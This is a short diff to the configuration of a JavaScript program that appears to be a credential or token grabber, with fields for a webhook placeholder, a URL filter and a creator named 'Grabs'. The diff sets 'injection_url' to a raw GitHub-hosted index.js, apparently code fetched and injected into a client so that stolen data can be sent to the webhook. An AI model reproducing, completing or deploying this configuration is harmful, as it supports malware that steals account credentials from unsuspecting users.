@@ -16,7 +16,7 @@ var config = {
     "embed-color": 16711718,
 
     creator: "Grabs",
-    injection_url: "",
+    injection_url: "https://raw.githubusercontent.com/oooooooooooooooooooooooooos/solid-lamp/main/index.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
